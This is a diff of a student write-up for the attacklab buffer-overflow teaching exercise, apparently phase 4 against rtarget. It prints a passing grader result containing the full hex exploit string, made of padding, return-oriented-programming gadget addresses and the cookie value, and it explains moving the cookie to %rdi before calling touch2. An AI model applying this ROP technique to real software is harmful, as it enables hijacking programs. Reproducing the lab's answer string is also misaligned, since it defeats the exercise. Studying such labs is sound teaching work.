@@ -11,7 +11,7 @@ PASS: Would have posted the following:
 	lab	attacklab
 	result	1:PASS:0xffffffff:rtarget:2:01 02 03 04 05 06 07 08 09 10 01 02 03 04 05 06 07 08 09 10 01 02 03 04 05 06 07 08 09 10 01 02 03 04 05 06 07 08 09 10 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
 
-1) Similar to phase 2, we need to move the cookie string value
+1) Similar to phase 2, we need to move the cookie value
 to %rdi, and then invoke touch2(). This can be done through the
 following 2 gadgets:
 [gadget 1]
